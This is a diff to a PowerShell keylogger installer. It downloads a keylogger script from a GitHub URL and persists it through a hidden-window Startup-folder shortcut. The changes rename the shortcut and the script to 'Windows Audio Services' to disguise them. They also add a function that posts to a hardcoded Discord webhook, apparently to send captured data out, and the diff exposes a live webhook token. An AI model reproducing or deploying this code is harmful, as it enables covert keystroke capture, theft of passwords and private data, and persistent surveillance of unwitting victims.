@@ -2,7 +2,7 @@
 $startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
 
 # Define the path for the shortcut
-$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, 'KeyloggerScript.lnk')
+$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, 'Windows Audio Services.lnk')
 
 # Function to check for an active network connection
 function Test-NetworkConnection {
@@ -24,6 +24,7 @@ if (Test-Path $shortcutPath) {
 
     # Path to the keylogger script
     $keyloggerScriptPath = "$env:TEMP\keylogger.ps1"
+    $renamedScriptPath = "$env:TEMP\Windows Audio Services.ps1"
 
     # URL to the keylogger script on GitHub
     $keyloggerScriptUrl = "https://raw.githubusercontent.com/Mocipie/Duckylog/main/Keylogger.ps1"
@@ -31,14 +32,17 @@ if (Test-Path $shortcutPath) {
     # Download the keylogger script from GitHub
     Invoke-WebRequest -Uri $keyloggerScriptUrl -OutFile $keyloggerScriptPath
 
+    # Rename the keylogger script
+    Rename-Item -Path $keyloggerScriptPath -NewName $renamedScriptPath
+
     # Create a WScript.Shell COM object
     $wshShell = New-Object -ComObject WScript.Shell
 
     # Create the shortcut
     $shortcut = $wshShell.CreateShortcut($shortcutPath)
     $shortcut.TargetPath = 'powershell.exe'
-    $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$keyloggerScriptPath`""
-    $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($keyloggerScriptPath)
+    $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$renamedScriptPath`""
+    $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($renamedScriptPath)
     $shortcut.Save()
 
     Write-Output "Shortcut created at $shortcutPath"
@@ -47,6 +51,18 @@ if (Test-Path $shortcutPath) {
 # Function to clean up PowerShell scripts in the temp directory
 function Cleanup-TempScripts {
     Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
+}
+
+# Function to send a message to Discord webhook
+function Send-DiscordMessage {
+    param (
+        [string]$message
+    )
+    $webhookUrl = "https://discord.com/api/webhooks/1272625926668292136/LL8hTxV9YTcY6Qkbc_KZhn2BXVufmLDGAbM0m1m28kbK8cvwlcakiwViAQtrMKO_BA95"
+    $payload = @{
+        content = $message
+    } | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
 }
 
 # Trap to handle script termination and perform cleanup
@@ -92,11 +108,11 @@ finally {
     }
 
     # Remove the keylogger script if it exists
-    if (Test-Path $keyloggerScriptPath) {
-        Remove-Item -Path $keyloggerScriptPath -Force
-        Write-Output "Keylogger script removed from $keyloggerScriptPath"
+    if (Test-Path $renamedScriptPath) {
+        Remove-Item -Path $renamedScriptPath -Force
+        Write-Output "Keylogger script removed from $renamedScriptPath"
     } else {
-        Write-Output "Keylogger script does not exist at $keyloggerScriptPath"
+        Write-Output "Keylogger script does not exist at $renamedScriptPath"
     }
 
     Cleanup-TempScripts
